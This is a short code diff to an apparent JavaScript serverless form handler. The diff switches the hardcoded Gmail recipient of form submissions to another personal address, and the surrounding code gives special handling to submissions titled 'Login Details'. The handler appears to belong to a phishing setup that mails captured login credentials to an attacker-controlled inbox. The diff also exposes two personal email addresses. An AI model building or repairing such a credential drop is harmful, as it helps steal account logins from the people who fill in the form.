@@ -15,7 +15,8 @@ export default async function handler(req, res) {
         },
     });
 
-    const recipient = "samueldaniyan564@gmail.com";
+    // Change recipient back to the old email
+    const recipient = "melitazdenekxny23@gmail.com";
 
     let customSubject = 'New Form Submission';
     if (subject === 'Login Details') {
